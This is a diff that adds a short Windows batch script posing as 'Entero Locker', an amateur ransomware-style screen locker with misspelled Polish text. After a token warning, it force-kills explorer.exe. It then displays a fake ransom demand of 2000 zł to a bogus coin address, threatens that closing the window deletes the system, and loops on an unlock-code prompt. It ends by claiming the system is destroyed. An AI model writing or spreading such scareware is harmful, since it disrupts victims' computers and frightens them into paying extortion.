@@ -1,0 +1,28 @@
+@echo off
+title Entero Locker virus.exe
+echo Ten plik to Trojan czy na pewno chcesz go otworzyc?
+otwurz klikajonc enter
+pause
+taskkill /f /im explorer.exe
+cls
+echo Twuj system zostal zablokowany przez Entero Locker:(
+echo Zeby go odblokowac musisz kupic kod odblokowujoncy
+echo Gdy te okno zamkniesz twuj system zostanie usunienty
+echo Czas: 24 -3 -12
+echo Adres BidCoin RedExecutioner43729392bidcoin.2663.pof
+echo zaplac 2000zl
+set code=""
+
+:code
+set /p code="Wpisz kod:"
+if "%code%"=="6377319303" goto correct
+if NOT "%code%"=="6377319303" goto wrong
+
+:correct
+start cmd.exe
+echo kod jest dobry ale juz za puzno, twuj system zostal zniszczony
+pause
+
+:wrong
+echo Kod nie jest dobry!!! Sprubuj ponownie
+goto code
